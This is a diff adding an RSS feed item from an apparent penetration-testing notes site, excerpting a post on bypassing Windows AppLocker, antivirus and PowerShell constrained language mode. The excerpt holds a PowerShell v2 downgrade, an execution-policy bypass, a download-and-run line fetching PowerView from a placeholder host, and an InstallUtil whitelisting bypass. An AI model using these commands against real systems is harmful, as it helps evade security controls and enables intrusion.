@@ -10,5 +10,17 @@
 	<atom:link href="/concepts/index.xml" rel="self" type="application/rss+xml" />
     
     
+    <item>
+      <title>Windows-Bypass</title>
+      <link>/concepts/bypass/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/concepts/bypass/</guid>
+      <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions.
+If PowerShell version 2 is available you may be able to use this trick.
+PowerShell -Version 2 -ExecutionPolicy ByPass -command &amp;quot;&amp;quot;  to check for constrained language mode.
+$ExecutionContext.SessionState.LanguageMode  $ExecutionContext.SessionState.LanguageMode = &amp;quot;FullLanguage&amp;quot;  ie (New-Object Net.WebClient).DownloadString(&#39;http://changeme/powerview.ps1&#39;)  [System.Console]::WriteLine(&amp;quot;Hello&amp;quot;)  c:\windows\microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\meh.exe  Bypassing anti virus</description>
+    </item>
+    
   </channel>
 </rss>
